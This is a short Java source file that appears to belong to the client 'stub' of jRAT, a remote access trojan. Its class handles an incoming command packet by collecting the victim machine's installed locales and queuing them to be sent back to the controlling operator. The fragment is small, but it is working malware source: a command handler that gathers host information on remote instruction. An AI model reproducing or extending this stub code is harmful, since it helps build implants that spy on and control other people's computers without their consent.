package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet11InstalledLocales;

import java.util.Locale;


public class Packet97Locales extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Locale[] installed = Locale.getAvailableLocales();

		Connection.addToSendQueue(new Packet11InstalledLocales(installed));
	}

}
